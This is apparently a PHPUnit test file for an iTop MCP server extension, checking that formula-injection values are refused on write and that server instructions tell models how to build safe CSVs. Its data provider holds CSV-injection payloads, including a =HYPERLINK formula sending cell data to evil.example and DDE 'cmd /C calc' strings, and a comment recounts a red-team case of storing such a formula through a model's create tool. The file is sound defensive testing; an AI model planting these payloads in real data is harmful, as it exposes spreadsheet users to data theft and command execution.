<?php
/**
 * @copyright Copyright (C) 2026 Altioo
 * @license   https://www.gnu.org/licenses/agpl-3.0.html AGPL-3.0-or-later
 */

declare(strict_types=1);

namespace Altioo\iTop\Extension\MCP\Test\Unit;

use Altioo\iTop\Extension\MCP\Helper\FormulaPolicy;
use Altioo\iTop\Extension\MCP\Server\ServerInstructions;
use Altioo\iTop\Extension\MCP\Service\AccessPolicy;
use PHPUnit\Framework\TestCase;

// iTop's own runner bootstraps with unittestautoload.php, which cannot
// autoload this module's test Support classes; this fills that gap and is a
// no-op when phpunit.xml.dist already loaded it.
require_once __DIR__.'/../bootstrap.php';

/**
 * Formula-shaped text is refused on the way in, and a reader is told how to
 * write a CSV safely on the way out.
 *
 * A red-team pass stored =HYPERLINK(…) in Server.name through
 * core_object_create. It detonates wherever the value lands in a spreadsheet:
 * iTop's CSV export, a REST client, or a CSV a model builds from what it
 * read here. The way in is the one place this module holds, so the rule is
 * pinned here - including what it must let through, because a guard that
 * refuses phone numbers gets turned off.
 */
class FormulaPolicyTest extends TestCase
{
	// tests/php-unit-tests/Unit -> module root
	private const ROOT = __DIR__.'/../../..';

	/**
	 * @return array<string, array{string}>
	 */
	public static function formulas(): array
	{
		return [
			'hyperlink'       => ['=HYPERLINK("https://evil.example/?"&A1,"click")'],
			'dde'             => ["+cmd|' /C calc'!A0"],
			'minus function'  => ['-2+3+cmd|\' /C calc\'!A0'],
			'at function'     => ['@SUM(1+1)*cmd|\' /C calc\'!A0'],
			'handle'          => ['@jdoe'],
			'bare equals'     => ['='],
			'tab'             => ["\t=1+1"],
			'carriage return' => ["\r=1+1"],
			'leading spaces'  => ['   =HYPERLINK("https://evil.example","x")'],
		];
	}

	/**
	 * @dataProvider formulas
	 */
	public function testAFormulaIsRefused(string $sValue): void
	{
		$sRefusal = FormulaPolicy::RefusalForText('name', $sValue);

		$this->assertIsString($sRefusal);
		$this->assertStringContainsString("'name'", $sRefusal);
		$this->assertStringContainsString('mcp_refuse_formula_values', $sRefusal);
	}

	/**
	 * @return array<string, array{string}>
	 */
	public static function data(): array
	{
		return [
			'international phone' => ['+33 1 23 45 67 89'],
			'phone with brackets' => ['+1 (555) 010-0199'],
			'negative number'     => ['-42'],
			'negative decimal'    => ['-3.5'],
			'dashed date'         => ['-2026-09-29'],
			'placeholder dash'    => ['-'],
			'double dash'         => ['--'],
			'plain text'          => ['srv-web-01'],
			'equals later'        => ['a=b'],
			'at later'            => ['guy@example.com'],
			'empty'               => [''],
			'spaces then phone'   => ['  +33 1 23 45 67 89'],
			'only spaces'         => ['   '],
		];
	}

	/**
	 * @dataProvider data
	 */
	public function testOrdinaryDataIsLeftAlone(string $sValue): void
	{
		$this->assertNull(FormulaPolicy::RefusalForText('name', $sValue));
	}

	public function testANonStringValueIsNotItsBusiness(): void
	{
		$this->assertNull(FormulaPolicy::RefusalFor('Server', 'name', 42));
		$this->assertNull(FormulaPolicy::RefusalFor('Server', 'name', ['add_item' => ['message' => '=1']]));
	}

	/**
	 * Every place that turns a caller's value into an attribute value asks
	 * the policy first, as MentionPolicyTest requires of mentions.
	 */
	public function testEveryWritePathAsksThePolicy(): void
	{
		$iFound = 0;
		$oFiles = new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator(self::ROOT.'/src', \FilesystemIterator::SKIP_DOTS));
		foreach ($oFiles as $oFile) {
			if ($oFile->getExtension() !== 'php') {
				continue;
			}
			$sSource = '';
			foreach (token_get_all((string) file_get_contents($oFile->getPathname())) as $mToken) {
				if (is_array($mToken) && in_array($mToken[0], [T_COMMENT, T_DOC_COMMENT], true)) {
					continue;
				}
				$sSource .= is_array($mToken) ? $mToken[1] : $mToken;
			}
			$iOffset = 0;
			while (($iMake = strpos($sSource, 'RestUtils::MakeValue(', $iOffset)) !== false) {
				$iFound++;
				$sBefore = substr($sSource, 0, $iMake);
				$iFunction = strrpos($sBefore, 'function ');
				$this->assertIsInt($iFunction);
				$this->assertStringContainsString(
					'FormulaPolicy::RefusalFor(',
					substr($sBefore, $iFunction),
					$oFile->getFilename().' turns a caller value into an attribute value without asking FormulaPolicy first'
				);
				$iOffset = $iMake + 1;
			}
		}

		$this->assertGreaterThanOrEqual(4, $iFound, 'expected the create, update, stimulus and bulk write paths');
	}

	/**
	 * The way out: values are returned as stored, so a model that builds a
	 * CSV from them is told how to keep it inert.
	 */
	public function testAReaderIsToldHowToWriteACsvSafely(): void
	{
		$sText = ServerInstructions::Text(AccessPolicy::FromScopes(['MCP-read']));

		$this->assertStringContainsString('put a single', $sText);
		$this->assertStringContainsString('run it as a formula', $sText);
	}

	public function testAWriterIsToldTheRuleBeforeBeingRefused(): void
	{
		$sOn = ServerInstructions::Text(AccessPolicy::FromScopes(['MCP-write']), null, null, [], null, [], true);
		$sOff = ServerInstructions::Text(AccessPolicy::FromScopes(['MCP-write']), null, null, [], null, [], false);
		$sReader = ServerInstructions::Text(AccessPolicy::FromScopes(['MCP-read']), null, null, [], null, [], true);

		$this->assertStringContainsString('may not start with =, +, -, @', $sOn);
		$this->assertStringNotContainsString('may not start with', $sOff);
		$this->assertStringNotContainsString('may not start with', $sReader);
	}
}
